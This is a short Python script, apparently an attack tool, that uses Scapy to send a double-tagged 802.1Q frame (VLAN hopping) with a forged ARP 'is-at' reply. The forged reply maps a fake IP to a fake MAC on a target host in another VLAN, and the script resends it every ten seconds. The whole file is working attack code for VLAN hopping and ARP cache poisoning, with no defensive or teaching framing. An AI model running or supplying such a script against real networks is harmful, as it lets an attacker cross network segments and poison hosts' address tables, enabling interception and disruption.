#!/usr/bin/python

import time
from scapy.all import *

iface = "en0"
target_ip = '192.168.1.2'
fake_ip = '192.168.1.3'
fake_mac = 'c0:d3:de:ad:be:ef'
our_vlan = 1
target_vlan = 2


ether = Ether()
dot1q1 = Dot1Q(vlan=our_vlan)
dot1q2 = Dot1Q(vlan=target_vlan)
arp = ARP(hwsrc=fake_mac, pdst=target_ip, psrc=fake_ip, op="is-at")

packet = ether/dot1q1/dot1q2/arp



try:
    while True:
        sendp(packet, iface=iface)
        time.sleep(10)

except KeyboardInterrupt:
    print("Exiting.. ")
    sys.exit(0)

